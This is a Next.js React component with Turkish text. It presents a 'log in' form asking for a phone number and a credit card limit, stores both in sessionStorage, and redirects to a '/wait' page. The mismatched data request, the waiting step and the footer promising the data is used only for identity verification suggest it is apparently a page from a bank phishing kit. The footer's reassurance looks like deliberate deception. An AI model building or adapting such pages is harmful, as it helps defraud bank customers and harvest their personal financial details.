"use client"
import { useState } from 'react'
import { useRouter } from 'next/navigation'
import Image from 'next/image'

const PhoneVerification = () => {
  const router = useRouter()
  const [phone, setPhone] = useState('')
  const [creditLimit, setCreditLimit] = useState('')
  const [errors, setErrors] = useState({
    phone: '',
    creditLimit: ''
  })
  
  // Telefon numarası formatlama
  const formatPhoneNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '')
    let formatted = cleaned

    if (cleaned.length >= 3) {
      formatted = `${cleaned.slice(0, 3)}`
      if (cleaned.length >= 6) {
        formatted += ` ${cleaned.slice(3, 6)}`
        if (cleaned.length >= 10) {
          formatted += ` ${cleaned.slice(6, 10)}`
        } else if (cleaned.length > 6) {
          formatted += ` ${cleaned.slice(6)}`
        }
      } else if (cleaned.length > 3) {
        formatted += ` ${cleaned.slice(3)}`
      }
    }

    return formatted
  }

  // Para formatı
  const formatCurrency = (value: string) => {
    // Sadece rakamları al
    const cleaned = value.replace(/\D/g, '')
    
    if (!cleaned) return ''
    
    // Sayıyı formatlayıp nokta ekle
    const number = parseInt(cleaned)
    return new Intl.NumberFormat('tr-TR').format(number)
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhoneNumber(e.target.value)
    if (formatted.replace(/\s/g, '').length <= 10) {
      setPhone(formatted)
      setErrors(prev => ({ ...prev, phone: '' }))
    }
  }

  const handleCreditLimitChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCurrency(e.target.value)
    setCreditLimit(formatted)
    setErrors(prev => ({ ...prev, creditLimit: '' }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    let hasErrors = false
    const newErrors = { phone: '', creditLimit: '' }

    // Telefon numarası validasyonu
    const cleanedPhone = phone.replace(/\D/g, '')
    if (cleanedPhone.length !== 10) {
      newErrors.phone = 'Lütfen geçerli bir telefon numarası girin'
      hasErrors = true
    }

    // Kredi kartı limiti validasyonu
    const cleanedLimit = creditLimit.replace(/\D/g, '')
    if (!cleanedLimit || parseInt(cleanedLimit) < 1000) {
      newErrors.creditLimit = 'Lütfen geçerli bir limit girin (minimum 1.000 TL)'
      hasErrors = true
    }

    setErrors(newErrors)

    if (hasErrors) return

    // Phone verilerini sessionStorage'a kaydet
    sessionStorage.setItem('phoneData', JSON.stringify({
      phone: "+90" + cleanedPhone,
      creditLimit: creditLimit
    }));

    // Wait sayfasına yönlendir
    router.push('/wait')
  }

  return (
    <div className="h-auto bg-white flex flex-col items-center justify-center p-4 mt-4">
      <div className="w-full max-w-[400px] bg-white rounded-[20px] border border-gray-200 p-8 shadow-sm">
        
        {/* Telefon Numarası */}
        <div className="mb-6">
          <h2 className="text-[#333] text-lg font-semibold mb-4">
            Telefon Numarası
          </h2>
          <div className="flex items-center border border-gray-300 rounded-md focus-within:border-[#800D51] transition-colors">
            {/* Türk bayrağı ve +90 kısmı */}
            <div className="flex items-center gap-2 pl-4 pr-2 py-3">
              <Image 
                src="/turk.png" 
                alt="Türkiye" 
                width={20} 
                height={20} 
                className="rounded-sm"
              />
              <span className="text-gray-700 font-medium">+90</span>
            </div>
            
            {/* Ayırıcı çizgi */}
            <div className="h-6 w-[1px] bg-gray-300"></div>
            
            {/* Telefon giriş alanı */}
            <input
              type="text"
              placeholder="555 123 4567"
              className="flex-1 px-4 py-3 border-0 focus:outline-none text-gray-700 text-base rounded-r-md"
              value={phone}
              onChange={handlePhoneChange}
            />
          </div>
          {errors.phone && (
            <p className="text-red-500 text-sm mt-2">{errors.phone}</p>
          )}
        </div>

        {/* Kredi Kartı Limiti */}
        <div className="mb-6">
          <h2 className="text-[#333] text-lg font-semibold mb-4">
            Kredi Kartı Limiti
          </h2>
          <div className="relative">
            <input
              type="text"
              placeholder="10.000"
              className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#800D51] text-base text-gray-700 pr-12"
              value={creditLimit}
              onChange={handleCreditLimitChange}
            />
            <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 text-base">
              TL
            </span>
          </div>
          {errors.creditLimit && (
            <p className="text-red-500 text-sm mt-2">{errors.creditLimit}</p>
          )}
        </div>

        {/* Giriş Yap Butonu */}
        <form onSubmit={handleSubmit}>
          <button
            type="submit"
            className="w-full bg-[#800D51] text-white rounded-md py-4 hover:bg-[#800D51]/90 transition font-semibold text-lg"
          >
            Giriş Yap
          </button>
        </form>
        
      </div>

      <div className="text-sm text-black mt-4 text-left">
        <strong>Güvenliğiniz İçin</strong>
        <br />
        Telefon numaranız ve kredi kartı limit bilgileriniz güvenle saklanır. Bu bilgiler yalnızca kimlik doğrulama amacıyla kullanılır.
      </div>

      <style jsx>{`
        input::placeholder {
          color: #999;
        }
        
        input:focus {
          box-shadow: 0 0 0 2px rgba(128, 13, 81, 0.1);
        }
      `}</style>
    </div>
  )
}

export default PhoneVerification